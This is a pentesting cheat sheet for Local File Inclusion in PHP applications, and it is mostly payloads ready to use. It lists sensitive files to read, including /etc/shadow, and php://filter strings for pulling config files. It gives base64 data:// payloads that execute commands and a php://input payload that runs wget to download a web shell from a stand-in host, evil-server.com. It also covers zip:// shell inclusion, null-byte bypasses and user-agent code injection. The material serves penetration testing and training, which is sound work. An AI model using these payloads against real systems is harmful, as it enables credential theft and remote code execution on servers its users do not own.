# Local File Inclusion

## path types

There are four main ways to include files via LFI

	?page=FileInDir			(using a file from the same dir)
	?page=../relative/path/to/file	(using a relative file path)
	?page=/path/to/file		(using a full file path)
	?page=wrapper://		(using a wrapper, see examples for PHP below)

## important files

The following files should definitely be looked at. Feel free to chime in if you think something is missing.

	/etc/passwd		(user info)
	/etc/shadow		(password hashes)
	/proc/net/fib_trie	(network info)
	/proc/cpuinfo		(hardware info)
	/proc/self/environ	(potential command exec)
	
Also make sure to look for application specific files (app configs, php, composer, etc.)

## PHP Wrappers - http://php.net/manual/de/wrappers.php

### filter streams

	?page=php://filter/resource=/etc/passwd
	?page=php://filter/resource=/var/www/dvwa/config/config.inc.php
	?page=php://filter/convert.base64-encode/resource=/var/www/dvwa/config/config.inc.php

### adding arbitrary content

Instead of including local files, data:// allows us to include our own arbitrary code. Replace "code" with the base64 string of the desired php code.

	?page=data://text/plain;base64,code
	<?php print "executing php code :)";?>		PD9waHAgcHJpbnQgImV4ZWN1dGluZyBwaHAgY29kZSA6KSI7Pz4K
	<?php print exec('whoami');?>			PD9waHAgcHJpbnQgZXhlYygnd2hvYW1pJyk7Pz4K
	<?php system('uname -a');?>			PD9waHAgc3lzdGVtKCd1bmFtZSAtYScpOz8+Cg== (make sure to URL-encode + to %2B)

### php wrappers

Send a POST request to $HOST/$PATH/?page=php://input and include one the payload as post parameter

	<?php system(pwd);?>
	<?php system('wget http://evil-server.com/shell.php.txt -O ./shell.php');?>
        
### others

Expect is not enabled by default in php so it might not work.

	page=expect://ls

Zip is a good way to use upload functions that allow zip files to upload a zipped php shell and include it via the LFI vulnerability

	page=zip://path/to/file.zip%23shell	("%23" == "#" url encoded)

## Null byte termination

This can be used to bypass file type filters based on file endings

	?page=/etc/passwd%00.php
	?page=/etc/passwd%2500



## /proc/self/environ

If /proc/self/environ can be access through the LFI vulnerability, we can inject arbitrary code via the user agent string and execute it through the LFI vulnerability. More info here: https://www.exploit-db.com/papers/12886/


## further reading

  * https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601
